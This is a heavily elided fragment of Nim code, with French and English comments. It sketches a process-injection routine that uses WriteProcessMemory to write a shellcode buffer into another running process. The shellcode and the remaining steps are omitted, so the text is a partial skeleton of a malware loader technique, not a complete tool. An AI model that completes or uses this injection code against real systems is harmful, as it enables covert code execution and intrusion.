...
# fonction nécessaire pour convertir la liste des noms de processus en cours
...
proc injection(processID: DWORD): bool = 
    ...
    var nb_Bytes: SIZE_T  # function output a SIZE_T data for number of bytes written
    let is_Success = WriteProcessMemory(hProcess,
                                    rPtr,
                                    addr(shellcode),
                                    cast[SIZE_T](shellcode.len),
                                    addr(nb_Bytes))        # Writes data to an area of memory in a specified process.
...
when isMainModule:
    ...
    # process for sure running now so we can get process ID
